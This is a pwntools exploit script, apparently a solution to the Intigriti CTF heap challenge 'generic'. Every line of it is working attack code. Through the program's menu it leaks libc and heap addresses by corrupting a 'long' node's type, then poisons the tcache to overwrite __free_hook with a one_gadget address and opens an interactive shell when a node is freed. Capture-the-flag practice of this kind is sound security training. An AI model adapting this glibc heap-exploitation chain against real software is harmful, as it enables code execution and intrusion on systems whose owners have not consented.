#!/usr/bin/env python3


from pwn import *


e = ELF("./generic_patched")
r = process("./generic_patched")
#r = remote("generic.ctf.intigriti.io",9999)
libc = ELF("./libc.so.6")
def add_int(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b"Enter value",f"{val}")

def add_long(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",f"{val}")

def add_double(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter value",f"{val}")

def add_char(val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Enter value",val)

def add_string(len_val,val):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"length:",f"{len_val}")
    r.sendafter(b"Enter string:",val)

def remove_node(index):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"remove >",f"{index}")

def change_int(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b"Enter value",f"{val}")

def change_long(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",f"{val}")

def change_corrupt_long(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Enter value",b"-")

def change_double(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Enter value",f"{val}")

def change_char(index,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Enter value",val)

def change_string(index,len_val,val):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"change >",f"{index}")
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"length:",f"{len_val}")
    r.sendafter(b"Enter string:",val)




add_string(150000,b"A" * 150)
change_corrupt_long(1)
r.sendlineafter(b">",b"1")
r.recvuntil(b"1. ")
libc_base = (int(r.recvline().strip()) - 16)  + 0x27000
add_string(39,b"A" * 24 + p8(0x40))
change_corrupt_long(2)
r.sendlineafter(b">",b"1")
r.recvuntil(b"2. ")
heap_base = (int(r.recvline().strip()) - 0x300) 
log.info("The heap base of the process is " + hex(heap_base))
log.info("The libc base of the process is " + hex(libc_base))
add_long(libc_base)
add_long(libc_base)
remove_node(4)
remove_node(3)
remove_node(2)
remove_node(1)
add_string(39,b"A" * 30)
change_string(1,4294967335,b"A" * 40 + p64(0x31) + p64(libc_base + libc.sym.__free_hook))
add_string(39,p64(libc_base + 0xe6c81))
remove_node(1)
r.interactive()
